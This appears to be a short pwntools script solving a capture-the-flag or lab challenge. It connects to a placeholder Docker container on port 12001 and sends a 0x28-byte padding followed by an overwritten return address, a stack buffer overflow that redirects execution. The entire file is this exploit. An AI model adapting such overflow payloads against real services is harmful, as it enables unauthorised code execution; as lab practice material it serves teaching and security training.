from pwn import *

# CHANGE IP
c = remote('<DOCKER-CONTAINER-IP>', 12001)
print(c.recv())
c.send(b'a' * 0x28 + b'\x55\x19\x40\x00\x00\x00\x00\x00\n')
print(c.recv())
